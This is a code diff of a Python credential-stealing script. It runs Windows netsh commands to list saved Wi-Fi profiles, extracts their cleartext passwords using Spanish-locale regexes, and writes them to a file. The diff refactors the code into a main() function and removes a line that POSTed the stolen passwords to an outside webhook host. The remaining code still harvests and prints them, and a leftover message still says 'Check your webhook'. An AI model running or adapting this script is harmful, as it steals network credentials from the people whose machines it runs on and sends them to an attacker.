@@ -1,47 +1,53 @@
 import subprocess, os, sys, requests, re, urllib, random
+def main(arg):
+    # Lists and regex
+    found_ssids = []
+    pwnd = []
+    wlan_profile_regex = r"Perfil de todos los usuarios\s+:\s(.*)$"
+    wlan_key_regex = r"Contenido de la clave\s+:\s(.*)$"
 
-# Lists and regex
-found_ssids = []
-pwnd = []
-wlan_profile_regex = r"Perfil de todos los usuarios\s+:\s(.*)$"
-wlan_key_regex = r"Contenido de la clave\s+:\s(.*)$"
-
-#Use Python to execute Windows command
-get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
-print(get_profiles_command)
-#Append found SSIDs to list
-matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
-for match in matches:
-    for group in match.groups():
-        found_ssids.append(group.strip())
-
-#Get cleartext password for found SSIDs and place into pwnd list
-for ssid in found_ssids:
-    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode('iso-8859-1')
-    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+    #Use Python to execute Windows command
+    get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
+    print(get_profiles_command)
+    #Append found SSIDs to list
+    matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
     for match in matches:
         for group in match.groups():
-            pwnd.append({
-                "SSID":ssid,
-                "Password":group.strip()
-                }) 
+            found_ssids.append(group.strip())
 
-#Check if any pwnd Wi-Fi exists, if not exit
-if len(pwnd) == 0:
-    print("No Wi-Fi profiles found. Exiting...")
-    sys.exit()
+    #Get cleartext password for found SSIDs and place into pwnd list
+    for ssid in found_ssids:
+        get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode('iso-8859-1')
+        matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+        for match in matches:
+            for group in match.groups():
+                pwnd.append({
+                    "SSID":ssid,
+                    "Password":group.strip()
+                    }) 
 
-print("Wi-Fi profiles found. Check your webhook...")
+    #Check if any pwnd Wi-Fi exists, if not exit
+    if len(pwnd) == 0:
+        print("No Wi-Fi profiles found. Exiting...")
+        sys.exit()
 
-file = 'passwords-'+str(random.randint(1, 1000000))+'.txt' 
+    print("Wi-Fi profiles found. Check your webhook...")
 
-f = open(file, 'x')
-for pwnd_ssid in pwnd:
-    f.write("[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) )
-f.close()
+    file = 'passwords-'+str(random.randint(1, 1000000))+'.txt' 
 
-final_payload = ""
-for pwnd_ssid in pwnd:
-    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+    f = open(file, 'x')
+    for pwnd_ssid in pwnd:
+        f.write("[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) )
+    f.close()
 
-r = requests.post("https://kind-teal-salmon-cape.cyclic.app/", params="format=json", data=final_payload)
+    final_payload = ""
+    for pwnd_ssid in pwnd:
+        final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+
+    print(final_payload)
+    return final_payload
+
+if __name__ == "__main__":
+    main(sys.argv[1])
+
+
